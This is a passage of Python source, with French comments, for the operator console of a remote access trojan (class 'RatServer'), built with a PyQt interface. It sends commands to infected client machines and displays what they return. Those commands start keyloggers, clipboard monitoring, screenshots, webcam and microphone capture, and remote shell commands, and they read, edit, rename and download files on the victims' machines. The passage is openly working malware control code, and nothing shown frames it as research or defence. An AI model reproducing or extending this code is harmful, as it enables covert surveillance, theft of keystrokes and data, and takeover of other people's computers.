                        logger.error(f"Erreur de liste de répertoire pour {addr_str}: {data['error']}")
                        return
                elif isinstance(data, list):
                    # Si data est une liste d'entrées directement
                    entries = []
                    for entry in data:
                        if isinstance(entry, dict):
                            entries.append(entry)
                else:
                    logger.error(f"Format de données non reconnu pour {addr_str}: {type(data)}")
                    return
                
                print(f"[DEBUG] Nombre d'entrées reçues: {len(entries)}")
                if entries:
                    print(f"[DEBUG] Première entrée: {entries[0]}")
                
                # Effacer la table avant de la remplir
                self.files_table.clearContents()
                self.files_table.setRowCount(0)  # Réinitialiser le nombre de lignes
                self.files_table.setRowCount(len(entries))
                
                # Ajouter les entrées à la table
                for row, entry in enumerate(entries):
                    if isinstance(entry, dict):
                        try:
                            # Créer les items pour chaque colonne
                            name = str(entry.get('name', ''))
                            type_ = str(entry.get('type', ''))
                            size = str(entry.get('size', ''))
                            modified = str(entry.get('modified', ''))
                            
                            print(f"[DEBUG] Traitement de l'entrée: nom={name}, type={type_}, taille={size}, modifié={modified}")
                            
                            name_item = QTableWidgetItem(name)
                            type_item = QTableWidgetItem(type_)
                            size_item = QTableWidgetItem(size)
                            modified_item = QTableWidgetItem(modified)
                            
                            # Définir l'alignement
                            size_item.setTextAlignment(Qt.AlignmentFlag.AlignRight | Qt.AlignmentFlag.AlignVCenter)
                            modified_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
                            
                            # Ajouter les items à la table
                            self.files_table.setItem(row, 0, name_item)
                            self.files_table.setItem(row, 1, type_item)
                            self.files_table.setItem(row, 2, size_item)
                            self.files_table.setItem(row, 3, modified_item)
                            
                            print(f"[DEBUG] Ajouté à la table: {name} ({type_})")
                        except Exception as e:
                            print(f"[DEBUG] Erreur lors de l'ajout de l'entrée {entry.get('name')}: {e}")
                            print(f"[DEBUG] Entrée complète: {entry}")
                
                # Mettre à jour le chemin actuel si disponible
                if isinstance(data, dict) and 'current_path' in data:
                    current_path = data['current_path']
                    self.current_paths[self.selected_client] = current_path
                    self.path_edit.setText(current_path)
                    print(f"[DEBUG] Chemin actuel mis à jour: {current_path}")
                
                # Ajuster la taille des colonnes
                self.files_table.resizeColumnsToContents()
                self.files_table.resizeRowsToContents()
                
                print(f"[DEBUG] Table mise à jour avec {self.files_table.rowCount()} lignes")
                
        except Exception as e:
            logger.error(f"Erreur lors de la mise à jour de la liste des fichiers pour {addr_str}: {e}")
            print(f"[DEBUG] Exception complète: {str(e)}")
            import traceback
            print(f"[DEBUG] Traceback: {traceback.format_exc()}")

    def update_keylog(self, address, key):
        """Met à jour le keylogger."""
        addr_str = f"{address[0]}:{address[1]}"
        if addr_str == self.selected_client:
            self.keylog_text.append(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {key}")

    def update_clipboard(self, address, content):
        """Met à jour le moniteur de presse-papiers."""
        addr_str = f"{address[0]}:{address[1]}"
        if addr_str == self.selected_client:
            self.clipboard_text.append(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {content}")

    def start_keylogger(self):
        """Démarre le keylogger."""
        if self.selected_client:
            addr = tuple(self.selected_client.split(':'))
            self.send_command(addr, {
                'command': 'start_keylogger'
            })

    def stop_keylogger(self):
        """Arrête le keylogger."""
        if self.selected_client:
            addr = tuple(self.selected_client.split(':'))
            self.send_command(addr, {
                'command': 'stop_keylogger'
            })

    def start_clipboard_monitor(self):
        """Démarre le moniteur de presse-papiers."""
        if self.selected_client:
            addr = tuple(self.selected_client.split(':'))
            self.send_command(addr, {
                'command': 'start_clipboard_monitor'
            })

    def stop_clipboard_monitor(self):
        """Arrête le moniteur de presse-papiers."""
        if self.selected_client:
            addr = tuple(self.selected_client.split(':'))
            self.send_command(addr, {
                'command': 'stop_clipboard_monitor'
            })

    def update_interval(self, value):
        """Met à jour l'intervalle de capture d'écran."""
        self.screenshot_interval = value

    def start_screen_capture(self):
        """Démarre la capture d'écran."""
        if self.selected_client:
            addr = tuple(self.selected_client.split(':'))
            self.send_command(addr, {
                'command': 'start_screen_capture',
                'data': {'interval': self.screenshot_interval}
            })

    def stop_screen_capture(self):
        """Arrête la capture d'écran."""
        if self.selected_client:
            addr = tuple(self.selected_client.split(':'))
            self.send_command(addr, {
                'command': 'stop_screen_capture'
            })

    def send_shell_command(self):
        """Envoie une commande au shell distant."""
        if self.selected_client and self.shell_input.text():
            addr = tuple(self.selected_client.split(':'))
            command = self.shell_input.text()
            self.shell_output.append(f"\n$ {command}")
            self.send_command(addr, {
                'command': 'shell_command',
                'data': {'cmd': command}
            })
            self.shell_input.clear()

    def update_shell_output(self, address, data):
        """Met à jour la sortie du shell."""
        addr_str = f"{address[0]}:{address[1]}"
        if addr_str == self.selected_client:
            self.shell_output.append(data)

    def update_zoom(self, value):
        """Met à jour le zoom de la capture d'écran."""
        if hasattr(self, 'current_pixmap') and not self.current_pixmap.isNull():
            zoom_factor = value / 100.0
            scaled_pixmap = self.current_pixmap.scaled(
                int(self.current_pixmap.width() * zoom_factor),
                int(self.current_pixmap.height() * zoom_factor),
                Qt.AspectRatioMode.KeepAspectRatio,
                Qt.TransformationMode.SmoothTransformation
            )
            self.screen_label.setPixmap(scaled_pixmap)
            # Mettre à jour le texte du zoom
            self.zoom_label.setText(f"{value}%")

    def update_screenshot(self, address, data):
        """Met à jour la capture d'écran."""
        addr_str = f"{address[0]}:{address[1]}"
        if addr_str == self.selected_client:
            try:
                image_data = base64.b64decode(data)
                image = QImage.fromData(image_data)
                if not image.isNull():
                    self.current_pixmap = QPixmap.fromImage(image)
                    if not self.current_pixmap.isNull():
                        # Appliquer le zoom actuel
                        zoom_factor = self.zoom_slider.value() / 100.0
                        scaled_pixmap = self.current_pixmap.scaled(
                            int(self.current_pixmap.width() * zoom_factor),
                            int(self.current_pixmap.height() * zoom_factor),
                            Qt.AspectRatioMode.KeepAspectRatio,
                            Qt.TransformationMode.SmoothTransformation
                        )
                        self.screen_label.setPixmap(scaled_pixmap)
                    else:
                        logger.error(f"Impossible de créer le pixmap pour {addr_str}")
                else:
                    logger.error(f"Impossible de créer l'image pour {addr_str}")
            except Exception as e:
                logger.error(f"Erreur lors de la mise à jour du screenshot: {e}")

    def handle_file_data(self, address, data):
        """Gère la réception des données de fichier."""
        addr_str = f"{address[0]}:{address[1]}"
        if addr_str == self.selected_client and hasattr(self, 'download_path'):
            try:
                with open(self.download_path, 'wb') as f:
                    f.write(base64.b64decode(data))
                logger.info(f"Fichier téléchargé avec succès vers {self.download_path}")
            except Exception as e:
                logger.error(f"Erreur lors de la sauvegarde du fichier téléchargé: {e}")
            finally:
                delattr(self, 'download_path')

    def handle_client_connected(self, address):
        """Gère la connexion d'un nouveau client."""
        addr_str = f"{address[0]}:{address[1]}"
        if addr_str not in self.clients:
            self.clients[addr_str] = {
                'socket': None,
                'hostname': 'Unknown',
                'os': 'Unknown',
                'cpu': 0.0,
                'memory': 0.0,
                'status': 'Connected'
            }
            # Initialiser le chemin actuel selon le système d'exploitation
            if platform.system() == 'Windows':
                self.current_paths[addr_str] = os.path.expanduser("~")
            else:
                self.current_paths[addr_str] = os.path.expanduser("~")
            print(f"New client connected: {addr_str}")

    def handle_client_disconnected(self, address):
        """Gère la déconnexion d'un client."""
        addr_str = f"{address[0]}:{address[1]}"
        if addr_str in self.clients:
            print(f"Client disconnected: {addr_str}")
            if addr_str in self.clients:
                del self.clients[addr_str]
            if addr_str in self.current_paths:
                del self.current_paths[addr_str]
            if addr_str == self.selected_client:
                self.selected_client = None
                self.path_edit.clear()
                self.files_table.setRowCount(0)
                self.process_table.setRowCount(0)
                self.keylog_text.clear()
                self.clipboard_text.clear()
                self.shell_output.clear()
                self.hostname_label.setText("N/A")
                self.os_label.setText("N/A")
                self.cpu_label.setText("0%")
                self.memory_label.setText("0%")

    def rename_file(self):
        """Renomme le fichier ou dossier sélectionné."""
        if not self.selected_client:
            return
            
        selected_rows = self.files_table.selectedItems()
        if not selected_rows:
            return
            
        row = selected_rows[0].row()
        old_name = self.files_table.item(row, 0).text()
        file_type = self.files_table.item(row, 1).text()
        old_path = os.path.join(self.current_paths[self.selected_client], old_name)
        
        new_name, ok = QInputDialog.getText(
            self,
            "Rename",
            f"Enter new name for {old_name}:",
            QLineEdit.EchoMode.Normal,
            old_name
        )
        
        if ok and new_name and new_name != old_name:
            addr = tuple(self.selected_client.split(':'))
            new_path = os.path.join(self.current_paths[self.selected_client], new_name)
            self.send_command(addr, {
                'command': 'rename_file',
                'data': {
                    'old_path': old_path,
                    'new_path': new_path
                }
            })
            # Attendre un peu avant de rafraîchir
            QTimer.singleShot(1000, self.refresh_files)

    def edit_file(self):
        """Ouvre un fichier pour l'éditer."""
        if not self.selected_client:
            return
            
        selected_rows = self.files_table.selectedItems()
        if not selected_rows:
            return
            
        row = selected_rows[0].row()
        file_name = self.files_table.item(row, 0).text()  # Colonne 'Name'
        file_type = self.files_table.item(row, 1).text()  # Colonne 'Type'
        
        if file_type != "File":
            QMessageBox.warning(self, "Warning", "You can only edit files, not directories.")
            return
            
        file_path = os.path.join(self.current_paths[self.selected_client], file_name)
        addr = tuple(self.selected_client.split(':'))
        
        # Créer une fenêtre d'édition
        edit_dialog = QDialog(self)
        edit_dialog.setWindowTitle(f"Edit - {file_name}")
        edit_dialog.setMinimumSize(800, 600)
        
        layout = QVBoxLayout(edit_dialog)
        
        # Zone de texte
        text_edit = QTextEdit()
        layout.addWidget(text_edit)
        edit_dialog.text_edit = text_edit  # Garder une référence
        
        # Boutons
        button_layout = QHBoxLayout()
        save_btn = QPushButton("Save")
        cancel_btn = QPushButton("Cancel")
        
        button_layout.addWidget(save_btn)
        button_layout.addWidget(cancel_btn)
        layout.addLayout(button_layout)
        
        # Garder une référence à la boîte de dialogue
        self.current_edit_dialog = edit_dialog
        
        # Charger le contenu du fichier
        self.send_command(addr, {
            'command': 'read_file',
            'data': {'path': file_path}
        })
        
        def save_changes():
            try:
                content = text_edit.toPlainText()
                encoded_content = base64.b64encode(content.encode('utf-8')).decode('utf-8')
                self.send_command(addr, {
                    'command': 'write_file',
                    'data': {
                        'path': file_path,
                        'content': encoded_content
                    }
                })
                edit_dialog.accept()
            except Exception as e:
                QMessageBox.critical(edit_dialog, "Error", f"Failed to save file: {str(e)}")
        
        def cleanup():
            if hasattr(self, 'current_edit_dialog'):
                delattr(self, 'current_edit_dialog')
            edit_dialog.reject()
        
        # Connecter les signaux
        save_btn.clicked.connect(save_changes)
        cancel_btn.clicked.connect(cleanup)
        edit_dialog.finished.connect(lambda: cleanup() if hasattr(self, 'current_edit_dialog') else None)
        
        # Afficher la fenêtre d'édition
        edit_dialog.exec()

    def handle_file_content(self, address, content):
        """Gère la réception du contenu d'un fichier."""
        addr_str = f"{address[0]}:{address[1]}"
        if hasattr(self, 'current_edit_dialog') and self.current_edit_dialog:
            try:
                text_edit = self.current_edit_dialog.findChild(QTextEdit)
                if text_edit:
                    if not content:
                        text_edit.setText("File is empty or could not be read.")
                        return
                        
                    decoded_content = base64.b64decode(content).decode('utf-8')
                    text_edit.setText(decoded_content)
            except Exception as e:
                logger.error(f"Erreur lors du décodage du contenu: {str(e)}")
                if text_edit:
                    text_edit.setText(f"Error loading file content: {str(e)}")

    def view_file(self):
        """Affiche le contenu d'un fichier."""
        if not self.selected_client:
            return
            
        selected_rows = self.files_table.selectedItems()
        if not selected_rows:
            return
            
        row = selected_rows[0].row()
        file_name = self.files_table.item(row, 0).text()
        file_type = self.files_table.item(row, 1).text()
        
        if file_type != "File":
            QMessageBox.warning(self, "Warning", "You can only view files, not directories.")
            return
            
        file_path = os.path.join(self.current_paths[self.selected_client], file_name)
        addr = tuple(self.selected_client.split(':'))
        
        # Créer une fenêtre de visualisation
        view_dialog = QDialog(self)
        view_dialog.setWindowTitle(f"View - {file_name}")
        view_dialog.setMinimumSize(800, 600)
        
        layout = QVBoxLayout(view_dialog)
        
        # Zone de texte
        text_edit = QTextEdit()
        text_edit.setReadOnly(True)  # Mode lecture seule
        text_edit.setStyleSheet("""
            QTextEdit {
                background-color: #2b2b2b;
                color: #ffffff;
                font-family: 'Courier New', monospace;
                font-size: 12px;
                padding: 10px;
            }
        """)
        layout.addWidget(text_edit)
        
        # Boutons
        button_layout = QHBoxLayout()
        edit_btn = QPushButton("Edit")
        close_btn = QPushButton("Close")
        button_layout.addWidget(edit_btn)
        button_layout.addWidget(close_btn)
        layout.addLayout(button_layout)
        
        def start_editing():
            text_edit.setReadOnly(False)
            edit_btn.setText("Save")
            edit_btn.clicked.disconnect()
            edit_btn.clicked.connect(save_changes)
        
        def save_changes():
            try:
                content = text_edit.toPlainText()
                encoded_content = base64.b64encode(content.encode('utf-8')).decode('utf-8')
                self.send_command(addr, {
                    'command': 'write_file',
                    'data': {
                        'path': file_path,
                        'content': encoded_content
                    }
                })
                text_edit.setReadOnly(True)
                edit_btn.setText("Edit")
                edit_btn.clicked.disconnect()
                edit_btn.clicked.connect(start_editing)
                QMessageBox.information(view_dialog, "Success", "File saved successfully!")
            except Exception as e:
                QMessageBox.critical(view_dialog, "Error", f"Failed to save file: {str(e)}")
        
        def cleanup():
            if hasattr(self, 'current_edit_dialog'):
                delattr(self, 'current_edit_dialog')
            view_dialog.close()
        
        # Connecter les signaux
        edit_btn.clicked.connect(start_editing)
        close_btn.clicked.connect(cleanup)
        view_dialog.finished.connect(cleanup)
        
        # Stocker la référence à la fenêtre de dialogue
        self.current_edit_dialog = view_dialog
        
        # Charger le contenu du fichier
        logger.debug(f"Demande de lecture du fichier: {file_path}")
        self.send_command(addr, {
            'command': 'read_file',
            'data': {'path': file_path}
        })
        
        # Afficher la fenêtre
        view_dialog.exec()

    def start_camera(self):
        """Démarre la capture de la caméra."""
        if self.selected_client:
            addr = tuple(self.selected_client.split(':'))
            self.send_command(addr, {
                'command': 'start_camera',
                'data': {'interval': 100}  # Intervalle par défaut de 100ms
            })

    def stop_camera(self):
        """Arrête la capture de la caméra."""
        if self.selected_client:
            addr = tuple(self.selected_client.split(':'))
            self.send_command(addr, {
                'command': 'stop_camera'
            })

    def update_camera_frame(self, address, frame_data):
        """Met à jour l'image de la caméra."""
        addr_str = f"{address[0]}:{address[1]}"
        if addr_str == self.selected_client and hasattr(self, 'camera_label'):
            try:
                # Décoder l'image base64
                image_data = base64.b64decode(frame_data)
                image = QImage.fromData(image_data)
                pixmap = QPixmap.fromImage(image)
                
                # Redimensionner l'image pour s'adapter au label
                scaled_pixmap = pixmap.scaled(
                    self.camera_label.size(),
                    Qt.AspectRatioMode.KeepAspectRatio,
                    Qt.TransformationMode.SmoothTransformation
                )
                self.camera_label.setPixmap(scaled_pixmap)
            except Exception as e:
                logger.error(f"Erreur lors de la mise à jour de l'image de la caméra: {e}")

    def update_audio_data(self, address, data):
        """Met à jour les données audio."""
        addr_str = f"{address[0]}:{address[1]}"
        if addr_str == self.selected_client:
            try:
                # Décoder les données audio base64
                audio_data = base64.b64decode(data)
                logger.info(f"Audio data received from {addr_str}: {len(audio_data)} bytes")
                
                # Mettre à jour le statut
                self.audio_status.setText(f"Audio capture active - {len(audio_data)} bytes received")
                
                # Sauvegarder les données audio dans un fichier temporaire
                temp_file = os.path.join(self.temp_dir, f"audio_{addr_str.replace(':', '_')}.wav")
                with open(temp_file, 'ab') as f:  # 'ab' pour ajouter les données
                    f.write(audio_data)
                
            except Exception as e:
                logger.error(f"Erreur lors de la mise à jour des données audio: {e}")
                self.audio_status.setText(f"Error: {str(e)}")

    def start_audio_capture(self):
        """Démarre la capture audio."""
        if self.selected_client:
            addr = tuple(self.selected_client.split(':'))
            logger.info(f"Starting audio capture for client {self.selected_client}")
            self.audio_status.setText("Starting audio capture...")
            self.send_command(addr, {
                'command': 'start_audio_capture'
            })

    def stop_audio_capture(self):
        """Arrête la capture audio."""
        if self.selected_client:
            addr = tuple(self.selected_client.split(':'))
            logger.info(f"Stopping audio capture for client {self.selected_client}")
            self.audio_status.setText("Audio capture stopped")
            self.send_command(addr, {
                'command': 'stop_audio_capture'
            })

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = RatServer()
    window.show()
    sys.exit(app.exec()) 